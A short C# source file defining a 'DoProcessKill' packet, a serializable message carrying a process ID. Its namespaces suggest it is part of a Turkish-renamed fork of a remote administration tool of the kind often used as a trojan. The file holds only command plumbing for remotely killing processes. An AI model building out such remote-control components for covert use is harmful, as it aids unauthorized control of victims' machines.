using System;
using xClient.KuuhakuÇekirdek.Ağ;

namespace xClient.KuuhakuÇekirdek.Paketler.ServerPaketleri
{
    [Serializable]
    public class DoProcessKill : IPacket
    {
        public int PID { get; set; }

        public DoProcessKill()
        {
        }

        public DoProcessKill(int pid)
        {
            this.PID = pid;
        }

        public void Execute(Client client)
        {
            client.Send(this);
        }
    }
}